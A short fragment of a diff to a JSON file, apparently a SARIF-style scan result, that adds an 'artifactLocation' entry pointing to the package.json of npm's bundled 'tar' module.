+                "artifactLocation": {
+                  "uri": "/usr/local/lib/node_modules/npm/node_modules/tar/package.json"
                 }
               }
             }
